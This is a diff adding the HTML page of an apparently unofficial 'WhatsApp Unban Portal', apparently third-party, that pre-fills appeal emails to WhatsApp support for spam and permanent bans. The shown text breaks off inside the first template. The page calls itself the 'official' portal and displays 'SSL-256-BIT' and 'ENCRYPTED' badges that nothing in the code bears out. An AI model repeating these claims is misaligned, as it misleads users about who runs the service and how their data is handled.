@@ -1,0 +1,1526 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+<title>Mynzxi | WhatsApp Unbanned System</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --red: #ff0a1f;
+    --red-dim: #8b0000;
+    --red-glow: rgba(255, 10, 31, 0.6);
+    --red-faint: rgba(255, 10, 31, 0.08);
+    --black: #050505;
+    --dark: #0a0a0a;
+    --panel: #0d0d0d;
+    --border: #1a0000;
+    --text: #c8c8c8;
+    --text-dim: #666;
+    --white: #f0f0f0;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--black);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    min-height: 100vh;
+    overflow-x: hidden;
+    position: relative;
+  }
+
+  /* Scanline overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.15) 2px,
+      rgba(0,0,0,0.15) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* Red vignette */
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: radial-gradient(ellipse at center, transparent 40%, rgba(139,0,0,0.35) 100%);
+    pointer-events: none;
+    z-index: 9998;
+  }
+
+  /* Animated grid background */
+  .grid-bg {
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(255,10,31,0.04) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,10,31,0.04) 1px, transparent 1px);
+    background-size: 40px 40px;
+    animation: gridShift 20s linear infinite;
+    z-index: 0;
+  }
+
+  @keyframes gridShift {
+    0% { background-position: 0 0; }
+    100% { background-position: 40px 40px; }
+  }
+
+  /* Glitch text animation */
+  @keyframes glitch {
+    0%, 100% { text-shadow: -2px 0 var(--red), 2px 0 #00ffff; transform: translate(0); }
+    20% { text-shadow: 3px 0 var(--red), -3px 0 #00ffff; transform: translate(-2px, 1px); }
+    40% { text-shadow: -3px 0 var(--red), 3px 0 #00ffff; transform: translate(2px, -1px); }
+    60% { text-shadow: 2px 0 #00ffff, -2px 0 var(--red); transform: translate(0); }
+    80% { text-shadow: -1px 0 var(--red), 1px 0 #00ffff; transform: translate(1px, 0); }
+  }
+
+  @keyframes flicker {
+    0%, 100% { opacity: 1; }
+    92% { opacity: 1; }
+    93% { opacity: 0.4; }
+    94% { opacity: 1; }
+    96% { opacity: 0.7; }
+    97% { opacity: 1; }
+  }
+
+  @keyframes pulse-border {
+    0%, 100% { box-shadow: 0 0 8px var(--red-glow), inset 0 0 8px rgba(255,10,31,0.05); }
+    50% { box-shadow: 0 0 20px var(--red-glow), 0 0 40px rgba(255,10,31,0.2), inset 0 0 15px rgba(255,10,31,0.08); }
+  }
+
+  @keyframes fadeSlide {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0; }
+  }
+
+  @keyframes redPulse {
+    0%, 100% { color: var(--red); }
+    50% { color: #ff4444; }
+  }
+
+  /* Header */
+  .header {
+    position: relative;
+    z-index: 10;
+    padding: 20px 40px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background: linear-gradient(180deg, rgba(13,0,0,0.9) 0%, transparent 100%);
+    animation: flicker 8s infinite;
+  }
+
+  .logo {
+    font-family: 'Orbitron', monospace;
+    font-weight: 900;
+    font-size: 1.1rem;
+    color: var(--red);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    animation: glitch 6s infinite;
+  }
+
+  .status-bar {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.7rem;
+    color: var(--red-dim);
+    letter-spacing: 2px;
+  }
+
+  .status-dot {
+    display: inline-block;
+    width: 6px;
+    height: 6px;
+    background: var(--red);
+    border-radius: 50%;
+    margin-right: 6px;
+    animation: blink 1.5s infinite;
+    box-shadow: 0 0 6px var(--red);
+  }
+
+  /* Warning ticker */
+  .ticker {
+    background: rgba(139,0,0,0.15);
+    border-top: 1px solid var(--red-dim);
+    border-bottom: 1px solid var(--red-dim);
+    padding: 6px 0;
+    overflow: hidden;
+    position: relative;
+    z-index: 10;
+  }
+
+  .ticker-inner {
+    display: flex;
+    animation: ticker 30s linear infinite;
+    white-space: nowrap;
+  }
+
+  .ticker-text {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.65rem;
+    color: var(--red);
+    letter-spacing: 3px;
+    padding-right: 80px;
+  }
+
+  @keyframes ticker {
+    0% { transform: translateX(0); }
+    100% { transform: translateX(-50%); }
+  }
+
+  /* Main container */
+  .container {
+    position: relative;
+    z-index: 10;
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 60px 30px;
+  }
+
+  /* Page sections */
+  .page {
+    display: none;
+    animation: fadeSlide 0.4s ease forwards;
+  }
+  .page.active { display: block; }
+
+  /* Hero section */
+  .hero {
+    text-align: center;
+    margin-bottom: 60px;
+  }
+
+  .hero-eyebrow {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.7rem;
+    color: var(--red);
+    letter-spacing: 6px;
+    text-transform: uppercase;
+    margin-bottom: 20px;
+    animation: redPulse 3s ease-in-out infinite;
+  }
+
+  .hero-title {
+    font-family: 'Orbitron', monospace;
+    font-size: clamp(2rem, 5vw, 3.5rem);
+    font-weight: 900;
+    color: var(--white);
+    line-height: 1.1;
+    margin-bottom: 16px;
+    animation: glitch 8s infinite;
+  }
+
+  .hero-title span {
+    color: var(--red);
+    display: block;
+  }
+
+  .hero-subtitle {
+    font-size: 1.05rem;
+    color: var(--text-dim);
+    max-width: 560px;
+    margin: 0 auto 10px;
+    line-height: 1.7;
+    font-weight: 400;
+  }
+
+  .hero-cert {
+    display: inline-block;
+    margin-top: 20px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.65rem;
+    color: var(--red-dim);
+    border: 1px solid var(--red-dim);
+    padding: 5px 16px;
+    letter-spacing: 3px;
+  }
+
+  /* Divider */
+  .divider {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin: 40px 0;
+  }
+  .divider-line {
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--red-dim), transparent);
+  }
+  .divider-text {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.6rem;
+    color: var(--red-dim);
+    letter-spacing: 4px;
+  }
+
+  /* Option cards */
+  .options-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 20px;
+    margin-top: 40px;
+  }
+
+  .option-card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    padding: 30px 24px;
+    cursor: pointer;
+    position: relative;
+    overflow: hidden;
+    transition: all 0.3s ease;
+    animation: pulse-border 4s ease-in-out infinite;
+  }
+
+  .option-card::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,10,31,0.06), transparent);
+    transition: left 0.5s ease;
+  }
+
+  .option-card:hover::before {
+    left: 100%;
+  }
+
+  .option-card:hover {
+    border-color: var(--red);
+    box-shadow: 0 0 30px var(--red-glow), inset 0 0 20px rgba(255,10,31,0.05);
+    transform: translateY(-3px);
+  }
+
+  .card-icon {
+    width: 44px;
+    height: 44px;
+    border: 1px solid var(--red-dim);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 18px;
+    font-size: 1.2rem;
+    color: var(--red);
+    position: relative;
+  }
+
+  .card-icon::before {
+    content: '';
+    position: absolute;
+    inset: -4px;
+    border: 1px solid rgba(255,10,31,0.2);
+  }
+
+  .card-tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.58rem;
+    color: var(--red);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    margin-bottom: 10px;
+  }
+
+  .card-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 1rem;
+    font-weight: 700;
+    color: var(--white);
+    margin-bottom: 10px;
+  }
+
+  .card-desc {
+    font-size: 0.85rem;
+    color: var(--text-dim);
+    line-height: 1.6;
+  }
+
+  .card-arrow {
+    position: absolute;
+    bottom: 20px;
+    right: 20px;
+    color: var(--red-dim);
+    font-size: 1.2rem;
+    transition: all 0.3s;
+  }
+
+  .option-card:hover .card-arrow {
+    color: var(--red);
+    transform: translateX(4px);
+  }
+
+  /* Version cards */
+  .version-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 16px;
+    margin-top: 30px;
+  }
+
+  @media(max-width: 500px) {
+    .version-grid { grid-template-columns: 1fr; }
+  }
+
+  .version-card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    padding: 24px 20px;
+    cursor: pointer;
+    position: relative;
+    transition: all 0.3s ease;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
+
+  .version-card:hover {
+    border-color: var(--red);
+    box-shadow: 0 0 20px var(--red-glow);
+    background: rgba(255,10,31,0.04);
+  }
+
+  .version-num {
+    font-family: 'Orbitron', monospace;
+    font-size: 1.8rem;
+    font-weight: 900;
+    color: var(--red);
+    opacity: 0.6;
+    min-width: 40px;
+  }
+
+  .version-info { flex: 1; }
+
+  .version-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.6rem;
+    color: var(--red);
+    letter-spacing: 3px;
+    margin-bottom: 4px;
+  }
+
+  .version-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 0.85rem;
+    font-weight: 700;
+    color: var(--white);
+  }
+
+  .version-badge {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.55rem;
+    color: var(--red);
+    border: 1px solid var(--red-dim);
+    padding: 2px 8px;
+    letter-spacing: 2px;
+    align-self: flex-start;
+  }
+
+  /* Page header */
+  .page-header {
+    margin-bottom: 40px;
+  }
+
+  .breadcrumb {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.65rem;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    margin-bottom: 20px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .breadcrumb-sep { color: var(--red-dim); }
+
+  .back-btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.65rem;
+    color: var(--red-dim);
+    letter-spacing: 2px;
+    cursor: pointer;
+    border: none;
+    background: none;
+    margin-bottom: 10px;
+    transition: color 0.2s;
+    padding: 0;
+  }
+
+  .back-btn:hover { color: var(--red); }
+
+  .page-title {
+    font-family: 'Orbitron', monospace;
+    font-size: clamp(1.4rem, 3.5vw, 2.2rem);
+    font-weight: 900;
+    color: var(--white);
+  }
+
+  .page-title span { color: var(--red); }
+
+  .page-desc {
+    font-size: 0.9rem;
+    color: var(--text-dim);
+    margin-top: 10px;
+    line-height: 1.7;
+    max-width: 600px;
+  }
+
+  /* Phone form */
+  .form-panel {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    padding: 40px;
+    position: relative;
+    animation: pulse-border 4s ease-in-out infinite;
+  }
+
+  .form-panel::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 2px;
+    background: linear-gradient(90deg, transparent, var(--red), transparent);
+  }
+
+  .form-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.65rem;
+    color: var(--red);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    display: block;
+    margin-bottom: 12px;
+  }
+
+  .form-input {
+    width: 100%;
+    background: rgba(0,0,0,0.6);
+    border: 1px solid var(--border);
+    color: var(--white);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 1.3rem;
+    padding: 16px 20px;
+    outline: none;
+    transition: all 0.3s;
+    letter-spacing: 2px;
+  }
+
+  .form-input:focus {
+    border-color: var(--red);
+    box-shadow: 0 0 15px rgba(255,10,31,0.3);
+  }
+
+  .form-input::placeholder {
+    color: var(--text-dim);
+    font-size: 0.9rem;
+    letter-spacing: 1px;
+  }
+
+  .form-hint {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.6rem;
+    color: var(--text-dim);
+    margin-top: 10px;
+    letter-spacing: 1px;
+  }
+
+  .form-hint span { color: var(--red-dim); }
+
+  /* Info boxes */
+  .info-box {
+    background: rgba(139,0,0,0.08);
+    border: 1px solid rgba(139,0,0,0.3);
+    border-left: 3px solid var(--red);
+    padding: 16px 20px;
+    margin: 24px 0;
+    font-size: 0.82rem;
+    color: var(--text-dim);
+    line-height: 1.7;
+  }
+
+  .info-box-title {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.6rem;
+    color: var(--red);
+    letter-spacing: 3px;
+    margin-bottom: 6px;
+  }
+
+  /* Submit button */
+  .submit-btn {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    width: 100%;
+    padding: 18px;
+    background: var(--red);
+    color: #000;
+    font-family: 'Orbitron', monospace;
+    font-weight: 700;
+    font-size: 0.85rem;
+    letter-spacing: 4px;
+    text-transform: uppercase;
+    border: none;
+    cursor: pointer;
+    margin-top: 28px;
+    position: relative;
+    overflow: hidden;
+    transition: all 0.3s;
+  }
+
+  .submit-btn::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+    transition: left 0.5s;
+  }
+
+  .submit-btn:hover::before { left: 100%; }
+
+  .submit-btn:hover {
+    background: #ff2233;
+    box-shadow: 0 0 30px var(--red-glow), 0 0 60px rgba(255,10,31,0.3);
+    letter-spacing: 6px;
+  }
+
+  .submit-btn:active { transform: scale(0.98); }
+
+  /* Footer */
+  .footer {
+    position: relative;
+    z-index: 10;
+    padding: 30px 40px;
+    border-top: 1px solid var(--border);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: 60px;
+    flex-wrap: wrap;
+    gap: 10px;
+  }
+
+  .footer-text {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.6rem;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+  }
+
+  .footer-text span { color: var(--red-dim); }
+
+  /* Corner decorations */
+  .corner-deco {
+    position: fixed;
+    width: 60px;
+    height: 60px;
+    z-index: 11;
+    opacity: 0.4;
+  }
+
+  .corner-tl {
+    top: 80px;
+    left: 16px;
+    border-top: 1px solid var(--red);
+    border-left: 1px solid var(--red);
+  }
+
+  .corner-br {
+    bottom: 16px;
+    right: 16px;
+    border-bottom: 1px solid var(--red);
+    border-right: 1px solid var(--red);
+  }
+
+  /* Warning badge */
+  .warning-strip {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    background: rgba(139,0,0,0.1);
+    border: 1px solid rgba(139,0,0,0.25);
+    padding: 12px 20px;
+    margin-bottom: 30px;
+  }
+
+  .warning-icon {
+    color: var(--red);
+    font-size: 1rem;
+    animation: blink 2s infinite;
+  }
+
+  .warning-text {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.62rem;
+    color: var(--text-dim);
+    letter-spacing: 1.5px;
+    line-height: 1.6;
+  }
+
+  /* Terminal line */
+  .terminal-line {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.65rem;
+    color: var(--red-dim);
+    margin-top: 6px;
+    letter-spacing: 2px;
+  }
+
+  .terminal-line::before {
+    content: '> ';
+    color: var(--red);
+  }
+
+  /* ID tag */
+  .request-id {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.6rem;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    margin-top: 4px;
+  }
+
+  /* Noise overlay */
+  canvas.noise {
+    position: fixed;
+    inset: 0;
+    pointer-events: none;
+    z-index: 1;
+    opacity: 0.025;
+  }
+
+  @media(max-width: 600px) {
+    .header { padding: 16px 20px; }
+    .container { padding: 40px 20px; }
+    .form-panel { padding: 24px 20px; }
+    .footer { padding: 20px; }
+    .options-grid { gap: 14px; }
+  }
+</style>
+</head>
+<body>
+
+<canvas class="noise" id="noise"></canvas>
+<div class="grid-bg"></div>
+
+<!-- Corner decorations -->
+<div class="corner-deco corner-tl"></div>
+<div class="corner-deco corner-br"></div>
+
+<!-- Header -->
+<header class="header">
+  <div>
+    <div class="logo">WA // UNBAN PORTAL</div>
+    <div class="terminal-line">SYSTEM SECURE · ENCRYPTED</div>
+  </div>
+  <div class="status-bar">
+    <span class="status-dot"></span>PORTAL AKTIF
+  </div>
+</header>
+
+<!-- Ticker -->
+<div class="ticker">
+  <div class="ticker-inner">
+    <span class="ticker-text">⚠ PORTAL RASMI PERMOHONAN UNBAN WHATSAPP &nbsp;///&nbsp; PASTIKAN NOMBOR BETUL SEBELUM HANTAR &nbsp;///&nbsp; PROSES MENGAMBIL MASA 24-72 JAM &nbsp;///&nbsp; HANYA SATU PERMOHONAN SETIAP NOMBOR &nbsp;///&nbsp; PORTAL RASMI PERMOHONAN UNBAN WHATSAPP &nbsp;///&nbsp; PASTIKAN NOMBOR BETUL SEBELUM HANTAR &nbsp;///&nbsp; PROSES MENGAMBIL MASA 24-72 JAM &nbsp;///&nbsp; HANYA SATU PERMOHONAN SETIAP NOMBOR &nbsp;///&nbsp;</span>
+    <span class="ticker-text">⚠ PORTAL RASMI PERMOHONAN UNBAN WHATSAPP &nbsp;///&nbsp; PASTIKAN NOMBOR BETUL SEBELUM HANTAR &nbsp;///&nbsp; PROSES MENGAMBIL MASA 24-72 JAM &nbsp;///&nbsp; HANYA SATU PERMOHONAN SETIAP NOMBOR &nbsp;///&nbsp; PORTAL RASMI PERMOHONAN UNBAN WHATSAPP &nbsp;///&nbsp; PASTIKAN NOMBOR BETUL SEBELUM HANTAR &nbsp;///&nbsp; PROSES MENGAMBIL MASA 24-72 JAM &nbsp;///&nbsp; HANYA SATU PERMOHONAN SETIAP NOMBOR &nbsp;///&nbsp;</span>
+  </div>
+</div>
+
+<!-- ============================================================ -->
+<!-- PAGE 1: MAIN / CHOOSE BAN TYPE -->
+<!-- ============================================================ -->
+<div id="page-main" class="page active">
+  <div class="container">
+
+    <div class="hero">
+      <div class="hero-eyebrow">// PERMOHONAN RASMI //</div>
+      <h1 class="hero-title">
+        WHATSAPP
+        <span>UNBAN PORTAL</span>
+      </h1>
+      <p class="hero-subtitle">
+        Portal ini adalah platform permohonan rasmi untuk membuka semula akaun WhatsApp yang telah dikenakan sekatan. Pilih jenis ban yang diterima untuk meneruskan proses permohonan.
+      </p>
+      <span class="hero-cert">// Powered By Mynzxi //</span>
+    </div>
+
+    <div class="divider">
+      <div class="divider-line"></div>
+      <div class="divider-text">PILIH JENIS BAN</div>
+      <div class="divider-line"></div>
+    </div>
+
+    <div class="warning-strip">
+      <span class="warning-icon">⬥</span>
+      <div class="warning-text">
+        PENTING: Pastikan anda memilih jenis ban yang betul. Pemilihan yang salah boleh melambatkan proses semakan. Semua maklumat yang dihantar adalah SULIT dan hanya digunakan untuk tujuan permohonan sahaja.
+      </div>
+    </div>
+
+    <div class="options-grid">
+
+      <div class="option-card" onclick="goToPage('page-spam')">
+        <div class="card-icon">⌬</div>
+        <div class="card-tag">// TYPE-01 //</div>
+        <div class="card-title">UNBAN SPAM</div>
+        <p class="card-desc">Akaun dikenakan sekatan akibat aktiviti spam atau penghantaran mesej beramai-ramai yang melanggar polisi WhatsApp.</p>
+        <div class="card-arrow">→</div>
+      </div>
+
+      <div class="option-card" onclick="goToPage('page-perm-fresh')">
+        <div class="card-icon">𖤗</div>
+        <div class="card-tag">// TYPE-02 //</div>
+        <div class="card-title">UNBAN PERMANENT FRESH</div>
+        <p class="card-desc">Akaun baharu yang dikenakan larangan kekal — biasanya berlaku dalam tempoh 24 jam pertama penggunaan.</p>
+        <div class="card-arrow">→</div>
+      </div>
+
+      <div class="option-card" onclick="goToPage('page-perm-hard')">
+        <div class="card-icon">𖤗</div>
+        <div class="card-tag">// TYPE-03 //</div>
+        <div class="card-title">UNBAN PERMANENT HARD</div>
+        <p class="card-desc">Larangan kekal bertahap tinggi. Akaun diblok secara menyeluruh dan memerlukan proses semakan yang lebih mendalam.</p>
+        <div class="card-arrow">→</div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+
+<!-- ============================================================ -->
+<!-- PAGE 2: UNBAN SPAM — CHOOSE VERSION -->
+<!-- ============================================================ -->
+<div id="page-spam" class="page">
+  <div class="container">
+    <div class="page-header">
+      <button class="back-btn" onclick="goToPage('page-main')">← KEMBALI</button>
+      <div class="breadcrumb">
+        <span>PORTAL</span>
+        <span class="breadcrumb-sep">///</span>
+        <span>UNBAN SPAM</span>
+      </div>
+      <h2 class="page-title">UNBAN <span>SPAM</span></h2>
+      <p class="page-desc">Pilih versi borang permohonan berdasarkan kategori spam yang dikenakan. Setiap versi direka untuk kes yang berbeza.</p>
+    </div>
+
+    <div class="version-grid">
+      <div class="version-card" onclick="goToForm('SPAM', 'V1')">
+        <div class="version-num">01</div>
+        <div class="version-info">
+          <div class="version-label">// SPAM //</div>
+          <div class="version-title">UNBAN SPAM V1</div>
+        </div>
+        <div class="version-badge">STANDARD</div>
+      </div>
+      <div class="version-card" onclick="goToForm('SPAM', 'V2')">
+        <div class="version-num">02</div>
+        <div class="version-info">
+          <div class="version-label">// SPAM //</div>
+          <div class="version-title">UNBAN SPAM V2</div>
+        </div>
+        <div class="version-badge">PRO</div>
+      </div>
+      <div class="version-card" onclick="goToForm('SPAM', 'V3')">
+        <div class="version-num">03</div>
+        <div class="version-info">
+          <div class="version-label">// SPAM //</div>
+          <div class="version-title">UNBAN SPAM V3</div>
+        </div>
+        <div class="version-badge">ADVANCED</div>
+      </div>
+      <div class="version-card" onclick="goToForm('SPAM', 'V4')">
+        <div class="version-num">04</div>
+        <div class="version-info">
+          <div class="version-label">// SPAM //</div>
+          <div class="version-title">UNBAN SPAM V4</div>
+        </div>
+        <div class="version-badge">ELITE</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ============================================================ -->
+<!-- PAGE 3: UNBAN PERMANENT FRESH — CHOOSE VERSION -->
+<!-- ============================================================ -->
+<div id="page-perm-fresh" class="page">
+  <div class="container">
+    <div class="page-header">
+      <button class="back-btn" onclick="goToPage('page-main')">← KEMBALI</button>
+      <div class="breadcrumb">
+        <span>PORTAL</span>
+        <span class="breadcrumb-sep">///</span>
+        <span>UNBAN PERMANENT FRESH</span>
+      </div>
+      <h2 class="page-title">UNBAN PERMANENT <span>FRESH</span></h2>
+      <p class="page-desc">Pilih versi borang permohonan untuk akaun baharu yang terkena larangan kekal dalam tempoh singkat.</p>
+    </div>
+
+    <div class="version-grid">
+      <div class="version-card" onclick="goToForm('PERMANENT FRESH', 'V1')">
+        <div class="version-num">01</div>
+        <div class="version-info">
+          <div class="version-label">// PERM FRESH //</div>
+          <div class="version-title">UNBAN PERM FRESH V1</div>
+        </div>
+        <div class="version-badge">STANDARD</div>
+      </div>
+      <div class="version-card" onclick="goToForm('PERMANENT FRESH', 'V2')">
+        <div class="version-num">02</div>
+        <div class="version-info">
+          <div class="version-label">// PERM FRESH //</div>
+          <div class="version-title">UNBAN PERM FRESH V2</div>
+        </div>
+        <div class="version-badge">PRO</div>
+      </div>
+      <div class="version-card" onclick="goToForm('PERMANENT FRESH', 'V3')">
+        <div class="version-num">03</div>
+        <div class="version-info">
+          <div class="version-label">// PERM FRESH //</div>
+          <div class="version-title">UNBAN PERM FRESH V3</div>
+        </div>
+        <div class="version-badge">ADVANCED</div>
+      </div>
+      <div class="version-card" onclick="goToForm('PERMANENT FRESH', 'V4')">
+        <div class="version-num">04</div>
+        <div class="version-info">
+          <div class="version-label">// PERM FRESH //</div>
+          <div class="version-title">UNBAN PERM FRESH V4</div>
+        </div>
+        <div class="version-badge">ELITE</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ============================================================ -->
+<!-- PAGE 4: UNBAN PERMANENT HARD — CHOOSE VERSION -->
+<!-- ============================================================ -->
+<div id="page-perm-hard" class="page">
+  <div class="container">
+    <div class="page-header">
+      <button class="back-btn" onclick="goToPage('page-main')">← KEMBALI</button>
+      <div class="breadcrumb">
+        <span>PORTAL</span>
+        <span class="breadcrumb-sep">///</span>
+        <span>UNBAN PERMANENT HARD</span>
+      </div>
+      <h2 class="page-title">UNBAN PERMANENT <span>HARD</span></h2>
+      <p class="page-desc">Pilih versi borang permohonan untuk akaun yang dikenakan larangan kekal peringkat tinggi yang memerlukan rayuan khusus.</p>
+    </div>
+
+    <div class="version-grid">
+      <div class="version-card" onclick="goToForm('PERMANENT HARD', 'V1')">
+        <div class="version-num">01</div>
+        <div class="version-info">
+          <div class="version-label">// PERM HARD //</div>
+          <div class="version-title">UNBAN PERM HARD V1</div>
+        </div>
+        <div class="version-badge">STANDARD</div>
+      </div>
+      <div class="version-card" onclick="goToForm('PERMANENT HARD', 'V2')">
+        <div class="version-num">02</div>
+        <div class="version-info">
+          <div class="version-label">// PERM HARD //</div>
+          <div class="version-title">UNBAN PERM HARD V2</div>
+        </div>
+        <div class="version-badge">PRO</div>
+      </div>
+      <div class="version-card" onclick="goToForm('PERMANENT HARD', 'V3')">
+        <div class="version-num">03</div>
+        <div class="version-info">
+          <div class="version-label">// PERM HARD //</div>
+          <div class="version-title">UNBAN PERM HARD V3</div>
+        </div>
+        <div class="version-badge">ADVANCED</div>
+      </div>
+      <div class="version-card" onclick="goToForm('PERMANENT HARD', 'V4')">
+        <div class="version-num">04</div>
+        <div class="version-info">
+          <div class="version-label">// PERM HARD //</div>
+          <div class="version-title">UNBAN PERM HARD V4</div>
+        </div>
+        <div class="version-badge">ELITE</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ============================================================ -->
+<!-- PAGE 5: PHONE NUMBER FORM -->
+<!-- ============================================================ -->
+<div id="page-form" class="page">
+  <div class="container">
+    <div class="page-header">
+      <button class="back-btn" id="form-back-btn" onclick="goBack()">← KEMBALI</button>
+      <div class="breadcrumb">
+        <span>PORTAL</span>
+        <span class="breadcrumb-sep">///</span>
+        <span id="crumb-type">-</span>
+        <span class="breadcrumb-sep">///</span>
+        <span id="crumb-version">-</span>
+      </div>
+      <h2 class="page-title" id="form-title">BORANG <span>PERMOHONAN</span></h2>
+      <p class="page-desc">Masukkan nombor telefon yang telah dikenakan sekatan. Pastikan nombor adalah tepat beserta kod negara.</p>
+    </div>
+
+    <div class="form-panel">
+
+      <div class="warning-strip" style="margin-bottom:28px;">
+        <span class="warning-icon">⬥</span>
+        <div class="warning-text">
+          Borang ini akan dibuka dalam aplikasi Gmail anda. Teks permohonan akan diisi secara automatik. Semak semula nombor telefon sebelum menghantar.
+        </div>
+      </div>
+
+      <label class="form-label" for="phone-input">NOMBOR TELEFON YANG DIKENAKAN SEKATAN</label>
+      <input
+        class="form-input"
+        type="tel"
+        id="phone-input"
+        placeholder="+60112345678"
+        maxlength="20"
+      />
+      <div class="form-hint"><span>CONTOH FORMAT:</span> +60112345678 &nbsp;·&nbsp; +601123456789 &nbsp;·&nbsp; +65XXXXXXXX</div>
+
+      <div class="info-box">
+        <div class="info-box-title">⬥ MAKLUMAT PENTING</div>
+        Selepas menekan butang "HANTAR PERMOHONAN", Gmail akan dibuka secara automatik dengan teks permohonan yang telah disediakan mengikut jenis dan versi yang dipilih. Anda hanya perlu klik <strong style="color:var(--white)">SEND / HANTAR</strong> dalam Gmail.
+      </div>
+
+      <button class="submit-btn" onclick="submitForm()">
+        ⬥ HANTAR PERMOHONAN ⬥
+      </button>
+
+      <div class="request-id" id="request-id" style="margin-top:14px;text-align:right;"></div>
+
+    </div>
+
+  </div>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+  <div class="footer-text">© 2026 WA UNBAN PORTAL &nbsp;·&nbsp; <span>SEMUA HAK TERPELIHARA</span></div>
+  <div class="footer-text"><span>ENC://</span> SSL-256-BIT &nbsp;·&nbsp; DATA SULIT</div>
+</footer>
+
+
+<script>
+// ============================================================
+// STATE
+// ============================================================
+let currentType = '';
+let currentVersion = '';
+let previousPage = 'page-main';
+
+// ============================================================
+// EMAIL CONFIGURATION — TUKAR MAKLUMAT DI BAWAH INI
+// ============================================================
+
+// ▼▼▼ TUKAR EMAIL PENERIMA DI SINI ▼▼▼
+const RECIPIENT_EMAIL = 'support@whatsapp.com';
+// ▲▲▲ TUKAR EMAIL PENERIMA DI SINI ▲▲▲
+
+
+// ============================================================
+// TEKS PERMOHONAN — TUKAR TEKS UNBAN DI BAHAGIAN INI
+// Gunakan {PHONE} untuk letak nombor telefon secara automatik
+// Gunakan {TYPE} untuk letak jenis ban
+// Gunakan {VERSION} untuk letak versi
+// ============================================================
+
+const UNBAN_TEXTS = {
+
+  // ──────────────────────────────────────────
+  // SPAM
+  // ──────────────────────────────────────────
+  'SPAM_V1': {
+    subject: '[RAYUAN UNBAN] Permohonan Rasmi Buka Semula Akaun WhatsApp — Spam — {PHONE}',
+    // ▼▼▼ TUKAR TEKS SPAM V1 DI SINI ▼▼▼
+    body: `Equipe de Suporte do WhatsApp,
+Venho respeitosamente solicitar a revisão do bloqueio aplicado à minha conta do WhatsApp, pois acredito que a restrição ocorreu devido a um erro de classificação automática como spam.
